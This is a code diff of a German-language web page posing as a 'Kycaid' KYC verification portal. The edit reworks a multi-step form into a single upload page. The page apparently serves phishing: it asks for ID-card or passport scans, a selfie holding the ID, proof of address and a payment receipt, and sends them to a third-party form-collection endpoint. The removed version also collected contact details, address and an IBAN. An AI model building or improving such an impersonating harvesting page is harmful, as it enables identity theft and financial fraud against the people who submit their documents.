@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>KYC Verifizierung</title>
+  <title>KYC Verifizierung – Dokumenten‑Upload</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet" />
   <style>
     :root {
@@ -11,19 +11,26 @@
       --gray-bg: #f5f5f5;
       --text: #111;
     }
-
-    * {
-      box-sizing: border-box;
-    }
-
+    * { box-sizing: border-box; }
     body {
       font-family: 'Inter', sans-serif;
       margin: 0;
       padding: 0;
-      background-color: var(--gray-bg);
+      background-image: url('https://identverfahrensysteme.github.io/Identifikationsverfahren/bg.png');
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      height: 100vh;
       color: var(--text);
     }
-
+    .form-container {
+      max-width: 700px;
+      background-color: #fff;
+      border-radius: 8px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.05);
+      margin: 40px auto 60px;
+      padding: 40px 32px;
+    }
     .kyc-icon {
       display: block;
       margin: 0 auto 10px;
@@ -31,39 +38,25 @@
       height: 48px;
       fill: var(--gold);
     }
-
-    .form-container {
-      max-width: 700px;
-      background-color: #fff;
-      border-radius: 8px;
-      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.05);
-      margin: 40px auto 60px;
-      padding: 40px 32px;
-    }
-
     h2 {
       text-align: center;
       font-size: 20px;
       font-weight: 900;
-      color: #000;
       margin-bottom: 12px;
     }
-
     p.subtitle {
       text-align: center;
       font-size: 14px;
       color: #666;
       margin-bottom: 24px;
     }
-
     label {
       display: block;
       font-weight: 700;
       font-size: 0.9rem;
       margin: 14px 0 6px;
     }
-
-    input, select, textarea {
+    input, select {
       width: 100%;
       padding: 12px;
       font-size: 15px;
@@ -71,14 +64,19 @@
       border: 1px solid #ccc;
       background-color: #f9f9f9;
     }
-
-    textarea {
-      min-height: 100px;
-      resize: vertical;
+    .small-text {
+      font-size: 14px;
+      color: #555;
+      margin-top: 4px;
+      margin-bottom: 12px;
     }
-
-    button {
-      padding: 14px;
+    .buttons {
+      display: flex;
+      justify-content: flex-end;
+      margin-top: 24px;
+    }
+    .buttons button {
+      padding: 14px 32px;
       background-color: transparent;
       color: #999;
       font-size: 16px;
@@ -88,11 +86,9 @@
       cursor: pointer;
       transition: all 0.3s ease;
     }
-
-    button:hover {
+    .buttons button:hover {
       color: var(--gold);
     }
-
     .Kycaid-footer {
       background-color: #f7f6f2;
       padding: 30px 20px;
@@ -101,85 +97,15 @@
       text-align: center;
       border-top: 1px solid #ddd;
     }
-
-    .footer-links {
-      margin-bottom: 16px;
-    }
-
     .footer-links a {
       color: #444;
       text-decoration: none;
       margin: 0 6px;
       font-weight: 500;
     }
-
-    .footer-links span {
-      margin: 0 4px;
-      color: #999;
-    }
-
-    .footer-links a:hover {
-      text-decoration: underline;
-    }
-
-    .footer-text p {
-      max-width: 800px;
-      margin: 12px auto;
-      line-height: 1.6;
-    }
-
-    /* Multi-step form styles */
-    .step {
-      display: none;
-    }
-
-    .step.active {
-      display: block;
-    }
-
-    .buttons {
-      display: flex;
-      justify-content: space-between;
-      margin-top: 20px;
-    }
-
-    .buttons button {
-      width: 150px;
-      margin-top: 0;
-    }
-
-    /* Two-column layout for fields */
-    .row {
-      display: flex;
-      gap: 20px;
-    }
-
-    .row > div {
-      flex: 1;
-    }
-
-    .small-text {
-      font-size: 14px;
-      color: #555;
-      margin-top: 4px;
-      margin-bottom: 12px;
-    }
-    body {
-      background-image: url('https://identverfahrensysteme.github.io/Identifikationsverfahren/bg.png');
-      background-size: cover;
-      background-position: center;
-      background-repeat: no-repeat;
-      height: 100vh;
-      margin: 0;
-    }
-    body {
-  background-image: url('https://identverfahrensysteme.github.io/Identifikationsverfahren/bg.png');
-  background-size: cover; /* Makes the background image cover the whole screen */
-  background-position: center; /* Centers the background image */
-  background-repeat: no-repeat; /* Ensures the image doesn’t repeat */
-  height: 100vh; /* Make sure it covers the full height of the page */
-  margin: 0; /* Remove any default margin */
-}
+    .footer-links span { margin: 0 4px; color: #999; }
+    .footer-links a:hover { text-decoration: underline; }
+    .footer-text p { max-width: 800px; margin: 12px auto; line-height: 1.6; }
   </style>
 </head>
 <body>
@@ -189,163 +115,79 @@
       <path d="M32 2L4 12v20c0 17.67 12.19 30.87 28 30 15.81.87 28-12.33 28-30V12L32 2zM28 44l-10-10 4.24-4.24L28 35.5l13.76-13.76L46 26l-18 18z"/>
     </svg>
 
-    <form id="kycForm" action="https://formcarry.com/s/PZLlPVetgjd" method="POST" enctype="multipart/form-data" novalidate>
-      <!-- Step 1 -->
-      <div class="step active" data-step="1">
-        <h2>Schritt 1: Persönliche Informationen</h2>
-        <p class="subtitle">Bitte geben Sie Ihre persönlichen Daten korrekt ein.</p>
+    <form id="kycForm" action="https://formcarry.com/s/3Izr5Sl7iQo" method="POST" enctype="multipart/form-data" novalidate>
+      <h2>Dokumenten‑Upload zur Verifizierung</h2>
+      <p class="subtitle">
+        Wählen Sie die Art Ihres Ausweisdokuments und laden Sie gut lesbare Farbkopien hoch (Vorder‑ und Rückseite).<br>
+        Zusätzlich ist ein aktuelles Selfie mit Ihrem Ausweis erforderlich.
+      </p>
 
-        <label for="fullname">Vor- und Nachname</label>
-        <input type="text" id="fullname" name="VorUndNachname" />
+      <label for="ausweisart">Art des Ausweisdokuments</label>
+      <select id="ausweisart" name="Ausweisart" required>
+        <option value="" disabled selected>Bitte auswählen</option>
+        <option value="Personalausweis">Personalausweis</option>
+        <option value="Reisepass">Reisepass</option>
+      </select>
 
-        <div class="row">
-          <div>
-            <label for="email">E-Mail-Adresse</label>
-            <input type="email" id="email" name="Email" />
-          </div>
-          <div>
-            <label for="telefon">Telefonnummer</label>
-            <input type="tel" id="telefon" name="Telefonnummer" />
-          </div>
-        </div>
+      <label for="vorderseite">Vorderseite (Datei)</label>
+      <input type="file" id="vorderseite" name="Vorderseite" accept=".jpg,.jpeg,.png,.pdf" required />
 
-        <label for="strasse">Straße und Hausnummer</label>
-        <input type="text" id="strasse" name="StrasseUndHausnummer" />
-
-        <div class="row">
-          <div>
-            <label for="plz">Postleitzahl</label>
-            <input type="text" id="plz" name="Postleitzahl" />
-          </div>
-          <div>
-            <label for="stadt">Stadt</label>
-            <input type="text" id="stadt" name="Stadt" />
-          </div>
-        </div>
-
-        <label for="land">Land</label>
-        <select id="land" name="Land">
-          <option value="Deutschland" selected>Deutschland</option>
-          <option value="Schweiz">Schweiz</option>
-          <option value="Luxemburg">Luxemburg</option>
-          <option value="Österreich">Österreich</option>
-        </select>
-
-        <label for="referenzkonto">Referenzkonto für Auszahlung</label>
-        <input type="text" id="referenzkonto" name="Referenzkonto" placeholder="IBAN" />
+      <div id="rueckseite-container">
+        <label for="rueckseite">Rückseite (Datei)</label>
+        <input type="file" id="rueckseite" name="Rückseite" accept=".jpg,.jpeg,.png,.pdf" required />
       </div>
 
-<!-- Step 2 -->
-<div class="step" data-step="2">
-  <h2>Schritt 2: Dokumenten-Upload zur Verifizierung</h2>
-  <p class="subtitle">
-    Wählen Sie die Art Ihres Ausweisdokuments und laden Sie gut lesbare Farbkopien hoch (Vorder- und Rückseite). Zusätzlich ist ein aktuelles Selfie mit Ihrem Ausweis erforderlich.
-  </p>
+      <label for="selfie">Selfie mit Ausweis</label>
+      <input type="file" id="selfie" name="SelfieMitAusweis" accept=".jpg,.jpeg,.png" required />
+      <p class="small-text">
+        Bitte laden Sie ein Selfie hoch, auf dem Sie Ihren Ausweis gut sichtbar in der Hand halten.
+      </p>
 
-  <label for="ausweisart">Art des Ausweisdokuments</label>
-  <select id="ausweisart" name="Ausweisart">
-    <option value="">Bitte auswählen</option>
-    <option value="Personalausweis" selected>Personalausweis</option>
-    <option value="Reisepass">Reisepass</option>
-  </select>
+      <label for="addressProof">Adressnachweis (z. B. Stromrechnung, Kontoauszug)</label>
+      <input type="file" id="addressProof" name="Adressnachweis" accept=".jpg,.jpeg,.png,.pdf" required />
+      <p class="small-text">
+        Bitte laden Sie ein offizielles Dokument hoch, das Ihre Adresse bestätigt (nicht älter als 3 Monate).
+      </p>
 
-  <label for="vorderseite">Vorderseite (Datei)</label>
-  <input type="file" id="vorderseite" name="Vorderseite" accept=".jpg,.jpeg,.png,.pdf" />
-
-  <div id="rueckseite-container">
-    <label for="rueckseite">Rückseite (Datei)</label>
-    <input type="file" id="rueckseite" name="Rückseite" accept=".jpg,.jpeg,.png,.pdf" />
-  </div>
-
-  <label for="selfie">Selfie mit Ausweis</label>
-  <input type="file" id="selfie" name="SelfieMitAusweis" accept=".jpg,.jpeg,.png,.pdf" />
-  <p class="small-text">Bitte laden Sie ein Selfie hoch, auf dem Sie Ihren Ausweis gut sichtbar in der Hand halten.</p>
-
-  <!-- NEW: Proof of Address -->
-  <label for="addressProof">Adressnachweis (z. B. Stromrechnung, Kontoauszug)</label>
-  <input type="file" id="addressProof" name="Adressnachweis" accept=".pdf,.jpg,.jpeg,.png" />
-  <p class="small-text">Bitte laden Sie ein offizielles Dokument hoch, das Ihre Adresse bestätigt (nicht älter als 3 Monate).</p>
-</div>
+      <!-- NEU -->
+      <label for="paymentReceipt">Zahlungsbestätigung / Quittung</label>
+      <input type="file" id="paymentReceipt" name="ZahlungsbestaetigungQuittung" accept=".jpg,.jpeg,.png,.pdf" required />
+      <p class="small-text">
+        Bitte laden Sie ihre Beleg Quittung hoch, die Ihre Zahlung bestätigt.
+      </p>
 
       <div class="buttons">
-        <button type="button" id="prevBtn" style="visibility:hidden;">Zurück</button>
-        <button type="button" id="nextBtn">Weiter</button>
+        <button type="submit">Absenden</button>
       </div>
     </form>
   </div>
 
   <footer class="Kycaid-footer">
     <div class="footer-links">
-      <a href="#">Information on Kycaid</a>
-      <span>|</span>
-      <a href="#">Terms of use</a>
-      <span>|</span>
-      <a href="#">Privacy statement</a>
-      <span>|</span>
-      <a href="#">Legal notices</a>
-      <span>|</span>
+      <a href="#">Information on Kycaid</a><span>|</span>
+      <a href="#">Terms of use</a><span>|</span>
+      <a href="#">Privacy statement</a><span>|</span>
+      <a href="#">Legal notices</a><span>|</span>
       <a href="#">Privacy Settings</a>
     </div>
     <div class="footer-text">
       <p>The products, services, information and/or materials contained within these web pages may not be available for residents of certain jurisdictions. Please consult the sales restrictions relating to the products or services in question for further information.</p>
-      <p>Copying, editing, modifying, distributing, sharing, linking or any other use (whether for commercial purposes or otherwise) of this material, other than personal viewing, without Kycaid's prior written permission is strictly prohibited.</p>
+      <p>Copying, editing, modifying, distributing, sharing, linking or any other use of this material without Kycaid's prior written permission is strictly prohibited.</p>
       <p>© Kycaid 2025. All rights reserved.</p>
     </div>
   </footer>
 
   <script>
     (function() {
-      const form = document.getElementById('kycForm');
-      const steps = form.querySelectorAll('.step');
-      const nextBtn = document.getElementById('nextBtn');
-      const prevBtn = document.getElementById('prevBtn');
-      const ausweisartSelect = document.getElementById('ausweisart');
-      const rueckseiteContainer = document.getElementById('rueckseite-container');
-      let currentStep = 0;
+      const select = document.getElementById('ausweisart');
+      const rueck = document.getElementById('rueckseite-container');
 
-      function showStep(step) {
-        steps.forEach((stepDiv, idx) => {
-          stepDiv.classList.toggle('active', idx === step);
-        });
-        prevBtn.style.visibility = step === 0 ? 'hidden' : 'visible';
-        nextBtn.textContent = step === steps.length - 1 ? 'Absenden' : 'Weiter';
-
-        // Show/hide Rückseite on step 2 based on Ausweisart
-        if(step === 1) {
-          if(ausweisartSelect.value === 'Reisepass') {
-            rueckseiteContainer.style.display = 'none';
-          } else {
-            rueckseiteContainer.style.display = 'block';
-          }
-        }
+      function toggleRueckseite() {
+        rueck.style.display = select.value === 'Reisepass' ? 'none' : 'block';
       }
 
-      nextBtn.addEventListener('click', () => {
-        if (currentStep < steps.length - 1) {
-          currentStep++;
-          showStep(currentStep);
-        } else {
-          form.submit();
-        }
-      });
-
-      prevBtn.addEventListener('click', () => {
-        if (currentStep > 0) {
-          currentStep--;
-          showStep(currentStep);
-        }
-      });
-
-      ausweisartSelect.addEventListener('change', () => {
-        if (ausweisartSelect.value === 'Reisepass') {
-          rueckseiteContainer.style.display = 'none';
-        } else {
-          rueckseiteContainer.style.display = 'block';
-        }
-      });
-
-      // Initialize
-      showStep(currentStep);
+      select.addEventListener('change', toggleRueckseite);
+      toggleRueckseite();
     })();
   </script>
 </body>
